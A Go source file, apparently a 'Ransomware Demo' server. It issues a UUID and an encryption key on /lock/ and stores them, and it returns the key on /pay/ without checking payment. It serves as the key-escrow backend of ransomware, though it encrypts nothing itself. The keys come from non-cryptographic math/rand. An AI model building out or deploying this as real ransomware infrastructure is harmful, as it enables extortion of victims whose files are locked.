package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
)

//Member -
type Key struct {
	Uuid string
	Key  string
}

const (
	Address = ":80"
)

func main() {
	InitDB()
	http.HandleFunc("/", handleMain)
	http.HandleFunc("/lock/", handleLock)
	http.HandleFunc("/pay/", handlePay)

	fs := http.FileServer(http.Dir("static"))
	http.Handle("/static/", http.StripPrefix("/static/", fs))

	fmt.Println("Listening on", Address)
	http.ListenAndServe(Address, nil)
}

func handleMain(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Welcome To Ransomware Demo!")
}

func handleLock(w http.ResponseWriter, r *http.Request) {
	key := Key{getRandomKey(8), getRandomKey(8)}
	jsonBytes, err := json.Marshal(key)
	if err != nil {
		panic(err)
	}

	KeyInsert(key)
	fmt.Fprintf(w, string(jsonBytes))
}

func handlePay(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	key := Key{r.Form.Get("uuid"), ""}
	KeySelect(&key)

	jsonBytes, err := json.Marshal(key)
	if err != nil {
		panic(err)
	}

	fmt.Fprintf(w, string(jsonBytes))
}

func getRandomKey(length int) string {
	key := make([]byte, length)

	_, err := rand.Read(key)
	if err != nil {
		panic(err)
	}
	return hex.EncodeToString(key)
}
